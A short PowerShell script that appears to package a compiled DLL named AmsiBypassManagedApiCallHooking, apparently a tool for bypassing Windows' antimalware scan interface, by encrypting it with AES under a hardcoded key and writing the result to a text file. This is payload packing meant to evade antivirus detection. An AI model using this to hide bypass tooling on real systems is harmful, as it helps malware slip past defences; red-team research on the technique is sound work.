$source = $PSScriptRoot
$dest = (new-object system.io.directoryinfo $source).parent.fullname +"\AmsiBypassManagedApiCallHooking\bin\x64\Release\AmsiBypassManagedApiCallHooking.dll"


$command = $PSScriptRoot+"\Out-CompressedEncryptedFile.ps1"

&$command -inputFile $dest -encrypt AES -key cHJvbWlzZXM= -outputFile "$PSScriptRoot\Promises2_AES.txt" 